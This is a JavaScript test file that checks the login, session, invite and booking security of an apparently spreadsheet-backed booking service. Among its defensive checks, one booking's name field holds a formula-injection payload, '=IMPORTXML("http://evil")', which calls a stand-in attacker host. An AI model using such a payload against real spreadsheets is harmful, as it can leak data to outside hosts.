const makeEnv=require('./harness'); const E=makeEnv(); let fails=0;
const ok=(c,m)=>{ console.log((c?'PASS ':'FAIL ')+m); if(!c) fails++; };
E.addClient('abc-fence','owner@abc.com',{loginEmails:'Wife@ABC.com'}); E.addClient('gonzalez','g@tree.com');
E.sheets.Bookings.push(E.sheets.Bookings[0].map(h=>({id:'B1',client:'gonzalez',status:'New',name:'Secret Customer'}[h]||'')));
// public
ok(E.get({action:'auth',c:'abc-fence'}).name==='ABC-FENCE','auth GET returns name (old ?c= fallback)');
ok(E.get({action:'auth',client:'abc-fence'}).name==='ABC-FENCE','auth GET with ?client= (c is reserved by Apps Script)');
ok(E.get({action:'slots',client:'abc-fence'}).ok===true,'slots GET with ?client=');
ok(E.get({action:'inbox',c:'abc-fence',key:'kabc-fence'}).error==='unknown_action','old ?action=inbox&key is gone');
ok(E.post({action:'inbox',client:'abc-fence',key:'kabc-fence'}).error==='auth','old inbox key no longer logs in');
// code login
ok(E.post({action:'login_code',client:'abc-fence',email:'stranger@x.com'}).ok===true && E.mail.length===0,'unknown email: same answer, no email sent');
ok(E.post({action:'login_code',client:'abc-fence',email:'g@tree.com'}).ok===true && E.mail.length===0,'other business owner email: no code for this business');
E.post({action:'login_code',client:'abc-fence',email:' Owner@ABC.com '}); ok(E.mail.length===1,'owner gets code email');
const code=E.mail[0].subject.slice(0,6);
ok(E.post({action:'login_verify',client:'abc-fence',email:'owner@abc.com',code:'000000'===code?'111111':'000000'}).error==='bad_code','wrong code rejected');
const v=E.post({action:'login_verify',client:'abc-fence',email:'owner@abc.com',code,device:'iPhone app'}); ok(v.ok&&v.token.length===64,'right code -> 64-char token');
ok(E.post({action:'login_verify',client:'abc-fence',email:'owner@abc.com',code}).error==='expired','code is single use');
ok(!JSON.stringify(E.sheets.Sessions).includes(v.token),'raw token never stored in sheet');
const ib=E.post({action:'inbox',token:v.token}); ok(ib.ok&&ib.name==='ABC-FENCE'&&ib.me==='owner@abc.com','token opens own inbox');
ok(E.post({action:'inbox',token:v.token,client:'gonzalez'}).error==='auth','token + other client id refused');
ok(E.post({action:'status',token:v.token,client:'abc-fence',id:'B1',status:'Canceled'}).error==='not_found','cannot touch other business booking id');
ok(E.post({action:'status',token:v.token,id:'B1',status:'Canceled'}).error==='not_found','(without client either)');
ok(E.post({action:'inbox',token:'x'.repeat(64)}).error==='auth','forged token refused');
// brute force
E.mail.length=0; E.post({action:'login_code',client:'abc-fence',email:'wife@abc.com'}); ok(E.mail.length===1,'loginEmails person gets a code');
let last; for(let i=0;i<5;i++) last=E.post({action:'login_verify',client:'abc-fence',email:'wife@abc.com',code:'123456'===E.mail[0].subject.slice(0,6)?'654321':'123456'});
ok(last.error==='too_many','5 wrong guesses kills the code');
ok(E.post({action:'login_verify',client:'abc-fence',email:'wife@abc.com',code:E.mail[0].subject.slice(0,6)}).error==='expired','even the right code is dead after that');
for(let i=0;i<5;i++) E.post({action:'login_code',client:'abc-fence',email:'spam@x.com'});
ok(E.post({action:'login_code',client:'abc-fence',email:'spam@x.com'}).error==='slow_down','send rate limit');
// google
E.ctx._google['G'.repeat(120)]={aud:'gcid.apps.googleusercontent.com',iss:'https://accounts.google.com',email:'owner@abc.com',email_verified:'true',exp:String(Date.now()/1000+600)};
E.ctx._google['W'.repeat(120)]={aud:'someone-else',iss:'https://accounts.google.com',email:'owner@abc.com',email_verified:'true',exp:String(Date.now()/1000+600)};
E.ctx._google['N'.repeat(120)]={aud:'gcid.apps.googleusercontent.com',iss:'https://accounts.google.com',email:'nobody@x.com',email_verified:'true',exp:String(Date.now()/1000+600)};
const g=E.post({action:'login_google',client:'abc-fence',credential:'G'.repeat(120)}); ok(g.ok&&g.token,'valid Google token signs in');
ok(E.post({action:'login_google',client:'abc-fence',credential:'W'.repeat(120)}).error==='google_failed','wrong audience refused');
ok(E.post({action:'login_google',client:'abc-fence',credential:'N'.repeat(120)}).error==='not_allowed','google account not on file refused');
ok(E.post({action:'login_google',client:'gonzalez',credential:'G'.repeat(120)}).error==='not_allowed','abc owner google cannot open gonzalez');
// invite
const link=E.ctx.makeInvite_('abc-fence'); const inv=link.split('#invite=')[1];
ok(E.post({action:'inbox',token:inv}).error==='auth','invite itself is not a session');
ok(E.post({action:'login_invite',client:'gonzalez',invite:inv}).error==='invite_bad','invite bound to its business');
const iv=E.post({action:'login_invite',client:'abc-fence',invite:inv,device:'iPhone app'}); ok(iv.ok && E.post({action:'inbox',token:iv.token}).ok,'invite redeems into a working session');
ok(E.post({action:'login_invite',client:'abc-fence',invite:inv}).error==='invite_used','invite is one-time');
// signout others
ok(E.post({action:'signout',token:g.token,others:true}).signedOut===2,'sign out other devices (code + invite sessions)');
ok(E.post({action:'inbox',token:v.token}).error==='auth','signed-out device refused immediately (cache cleared)');
ok(E.post({action:'inbox',token:g.token}).ok,'current device still works');
E.post({action:'signout',token:g.token}); ok(E.post({action:'inbox',token:g.token}).error==='auth','sign out this device');
// expiry
const v2=(E.mail.length=0,E.post({action:'login_code',client:'abc-fence',email:'owner@abc.com'}),E.post({action:'login_verify',client:'abc-fence',email:'owner@abc.com',code:E.mail[0].subject.slice(0,6)}));
const S=E.sheets.Sessions, H=S[0]; S[S.length-1][H.indexOf('expires')]=new Date(Date.now()-1000); Object.keys(E.cache).filter(k=>k.startsWith('sess_')).forEach(k=>delete E.cache[k]);
ok(E.post({action:'inbox',token:v2.token}).error==='auth','expired session refused');
// formula injection + booking still works
const mon=new Date(); mon.setDate(mon.getDate()+3); mon.setHours(10,0,0,0);
const slots=E.get({action:'slots',c:'abc-fence'}); const s0=slots.days[0].times[0].start;
const bk=E.post({action:'book',client:'abc-fence',slotStart:s0,name:'=IMPORTXML("http://evil")',phone:'+1 865 555 0100',address:'12 Main St',job:'Gate'});
ok(bk.ok,'public booking still works');
ok(E.post({client:'abc-fence',slotStart:s0,name:'Pat',phone:'8655550100',address:'12 Main St'}).error==='slot_taken','old sites with no action still book (double-book guarded)');
ok(E.post({action:'weird'}).error==='unknown_action','unknown action no longer falls through to booking');
const sent=E.mail.find(m=>/New booking/.test(m.subject)); ok(sent && /getpricewink\.com\/inbox\/\?c=abc-fence#start/.test(sent.htmlBody) && !/kabc-fence/.test(sent.htmlBody),'owner email link has no secret');
ok(E.post({action:'inbox',token:'bad'}).detail===undefined,'no internal error details');
console.log(fails?fails+' FAILED':'ALL PASSED');
